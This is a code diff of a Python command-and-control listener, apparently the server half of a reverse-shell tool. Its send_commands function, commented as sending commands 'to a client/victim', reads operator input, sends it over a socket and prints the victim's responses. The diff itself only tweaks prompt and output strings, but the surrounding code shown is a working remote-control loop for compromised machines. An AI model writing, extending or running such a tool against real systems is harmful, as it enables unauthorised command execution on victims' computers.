@@ -33,18 +33,18 @@ def accept_connection ():
 #send commands to a client/victim
 def send_commands(connection):
     while True:
-        cmd = input("Enter command: ")
+        cmd = input()
         if cmd == "quit":
             connection.close()
             s.close()
             sys.exit()
         if len(str.encode(cmd)) > 0:
-            print("Sending the data over the connection!")
+            print("Sending the command over the connection!")
             connection.send(str.encode(cmd))
             print("Data received from the client: " + "\n")
             client_response_byte  = connection.recv(1024)
             client_response_str = client_response_byte.decode("utf-8")
-            print(client_response_str, end="")
+            print(client_response_str, end=" ")
 
 def main():
     create_socket()
